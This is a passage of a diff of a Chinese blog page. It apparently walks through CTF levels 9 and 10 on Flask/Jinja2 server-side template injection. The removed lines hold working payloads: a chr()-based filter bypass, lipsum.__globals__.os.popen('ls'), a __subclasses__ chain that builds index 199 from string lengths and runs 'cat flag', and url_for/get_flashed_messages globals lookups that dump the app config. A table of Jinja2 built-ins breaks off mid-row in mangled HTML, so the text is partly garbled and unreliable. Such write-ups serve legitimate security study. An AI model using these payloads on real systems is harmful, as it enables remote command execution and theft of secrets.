-<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr=url_for.__globals__[<span class="hljs-string">&#x27;__builtins_&#x27;</span>].chr <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[chr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">99</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">115</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">95</span>)]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-# Level 9
-
-过滤数字
-
-但我们的payload并没有数字`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`
-
-为了学习，我们这里还是讲如何构造数字，比如我们构造10：
-
-`&#123;%set a='aaaaaaaaaa'|length%&#125;&#123;&#123;a&#125;&#125;`
-
-![image-20250216155226644](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358687.png)
-
-然后我们构造199，利用第一关的payload
-
-<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> a=<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aaaaaaaaaa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>*<span class="hljs-string">&#x27;aa&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span>-<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123;().__class__.__base__.__subclasses__()[a].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&quot;cat flag&quot;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-![image-20250216155604275](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358744.png)
-
-
-
-# Level 10
-
-直接获取config失败
-
-![image-20250216160126527](https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202507132358189.png)
-
-还有别的获取config的方法
-
-<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
-
-这里我们再提一下常见的内置函数和内置对象，
-
-
-
-
-
-
-
-| 类型         | 名称/方法              | 描述                                                         | 典型用途或示例                                               |
-| ------------ | ---------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
-| **内置函数** | `lipsum`               | 用于生成 Lorem Ipsum 占位文本，默认提供多段随机文本。        | 模板中填充测试内容：`&#123;&#123; lipsum() &#125;&#125;`。                       |
-|              | `url_for`              | 根据视图函数名生成对应的 URL 路径，支持动态参数。            | 生成链接：`<a href="&#123;&#123; url_for('home') &#125;&#125;">Home</a>`。       |
-|              | `get_flashed_messages` | 获取通过 `flash()` 方法设置的闪现消息，通常用于一次性提示（如成功/错误消息）。 | 显示消息：`&#123;% for msg in get_flashed_messages() %&#125;&#123;&#123; msg &#125;&#125;&#123;% endfor %&#125;</code>。</td>
-</tr>
-<tr>
-<td><strong>内置对象</strong></td>
-<td><code>cycler</code></td>
-<td>Jinja2 的循环状态管理工具，用于跟踪迭代进度（如奇偶行标记）。</td>
-<td>标记交替行：<code>&#123;% set cycle = cycler("odd", "even") %&#125;</code>。</td>
-</tr>
-<tr>
-<td></td>
-<td><code>joiner</code></td>
-<td>Jinja2 的字符串拼接工具，自动处理分隔符（如逗号）。</td>
 <td>拼接列表：&#96;</td>
 </tr>
 </tbody></table>
@@ -845,9 +463,9 @@ payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`�
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/07/13/Flask%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/" title="Flask安全问题">
+                      <a href="/2025/07/13/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="python反序列化学习总结">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Flask安全问题</span>
+                        <span class="hidden-mobile">python反序列化学习总结</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -855,8 +473,8 @@ payload之一`&#123;&#123;lipsum.__globals__.os.popen('ls').read()&#125;&#125;`�
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/07/13/Web%E5%AE%89%E5%85%A8%E4%B8%AD%E7%9A%84%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" title="Web安全中的哈希函数">
-                        <span class="hidden-mobile">Web安全中的哈希函数</span>
+                      <a href="/2025/07/13/SSTI%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="SSTI学习总结">
+                        <span class="hidden-mobile">SSTI学习总结</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
